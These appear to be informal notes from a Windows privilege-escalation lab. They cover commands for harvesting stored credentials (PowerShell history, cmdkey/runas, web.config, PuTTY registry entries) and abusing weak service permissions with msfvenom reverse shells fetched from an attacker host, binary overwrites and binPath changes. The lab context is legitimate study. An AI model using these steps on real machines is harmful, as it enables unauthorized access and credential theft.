note that I don't like Windows, so expect a few ranting sections
# Windows privilege escalation

### weaknesses are similar to other systems...
- misconfigured services or scheduled tasks
- excessive priviliges for our account
- vulnerable software
- missing Windows security patches

## Windows Users
### -- user accounts --
```
Administrators = can do almost anything anywhere

Standard users = limited access (usually limited to their files)
```

### -- built-in accounts --
```
SYSTEM / LocalSystem = more than Administrator, internal account for Windows services with full system access

Local Service = default Windows services account with minimum privileges, uses anonymous credentials

Network Service = same as Local Service but can access network through computer credentials
```

# Unusual password spots

### powershell history
as expected, it goes something like this
```
"Invoke-Command read-history-file-command some/weird/path/ConsoleHost_history.txt"
```
the actual command:
`type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

or also: `Get-Content (Get-PSReadLineOption).HistorySavePath`

### saved credentials
`cmdkey /list` gets you saved credentials

you can't see actual passwords...

you can try the username with runas, like this:

`runas /savecred /user:admin cmd.exe`

### IIS configuration

```
IIS = Internet Information Services, default web server for Windows
```
find database connection strings:

`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

### PuTTY
```
common SSH client for Windows, can store sessions and passwords
```

it doesn't store SSH passwords, but
it does store proxy passwords:

`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

## Example:
we looked at `cmdkey /list`, found mike.katz

now we open cmd as him

`runas /savecred /user:mike.katz cmd.exe`

remember:

`ls` is `dir`

`cat` is `type`

`clear` is `cls`

so we type'd his flag

---
# Abusing service misconfigurations

### Windows Services
```
managed by the Service Control Manager (SCM), which assigns each service an executable

this executable is ran each time the service is started
```

to get service structure (along with the executable name):

`sc qc <SERVICE_NAME>`

---
### Insecure Permissions on Service Executable

we will cover a vulnerability in system scheduler

`sc qc WindowsScheduler`

it runs as svcuser1 and the executable is WService.exe

`icacls C:\PROGRA~2\SYSTEM~1\WService.exe`

oh, the Everyone group has modify permissions... let's overwrite it

attacker:
```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.114.112.50 LPORT=4445 -f exe-service -o rev-svc.exe

$ python3 -m http.server
```

target downloads it:

`wget http://10.114.112.50:8000/rev-svc.exe -O rev-svc.exe`

we also need to grant full permission to everyone, so we overwrite the real exe with our reverse shell exe

```
PS C:\Users\thm-unpriv> cd C:\PROGRA~2\SYSTEM~1\

PS C:\Program Files (x86)\SystemScheduler> move WService.exe WService.exe.bkp

PS C:\Program Files (x86)\SystemScheduler> move C:\Users\thm-unpriv\rev-svc.exe WService.exe

PS C:\Program Files (x86)\SystemScheduler> icacls WService.exe /grant Everyone:F
```

attacker:

`nc -lvp 4445`

wait for service restart and voila, we are svcuser1

# Insecure Service permissions
```
we used Accesschkk from sysinternals to find services with insecure permissions

here we found SERVICE_ALL_ACCESS was set for BUILTIN\\Users

this means we can reconfigure the service to a revshell
```

attacker (10.114.162.65):
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.114.162.65 LPORT=4447 -f exe-service -o rev-svc3.exe

nc -lvp 4447
```

target:
```
# download the revshell
wget http://10.114.112.50:8000/rev-svc3.exe -O rev-svc3.exe

# 
sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

# normally we would wait for a restart but we can trigger it
$ sc.exe stop THMService
$ sc.exe start THMService
```
---

this was about the halfway point of the lab, but it's getting long so this is the end

another "yeah bro 60 minute lab" haha (had to restart the machines > 5 times)
# (* _*)

